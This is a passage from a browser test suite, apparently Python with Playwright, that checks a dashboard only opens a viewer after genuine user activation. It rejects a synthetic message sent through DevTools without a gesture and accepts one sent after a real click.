    assert page.evaluate("window.__fake.calls.filter((c) => c.stream).length") == 3             # the page's own plus two: the cap


def test_the_real_user_activation_api_is_what_gates_open(dash, page, browser_name):
    """No harness override: the host reads navigator.userActivation. The driver's scripts switch activation on (and so does
    every click), so the test waits it out and then sends the event the way a page's own script would."""
    if browser_name != "chromium":
        pytest.skip("needs a DevTools session to evaluate without a user gesture")
    dash.open(real_activation=True)
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    page.wait_for_timeout(5800)                                       # transient activation lasts about five seconds
    cdp = page.context.new_cdp_session(page)
    assert cdp.send("Runtime.evaluate", {"expression": "navigator.userActivation.isActive", "userGesture": False, "returnByValue": True})["result"]["value"] is False
    expr = "window.__port.dispatchEvent(new MessageEvent('message', {data: {t: 'open', path: '/t/L-1/x'}}))"
    cdp.send("Runtime.evaluate", {"expression": expr, "userGesture": False})
    page.wait_for_timeout(400)
    assert len(dash.calls()) == n and dash.ev("viewer") == []
    dash.frame().locator("#h").click()                                # a real click inside the frame: the parent is activated
    cdp.send("Runtime.evaluate", {"expression": expr, "userGesture": False})
    page.wait_for_function("() => window.__ev.viewer.length === 1")
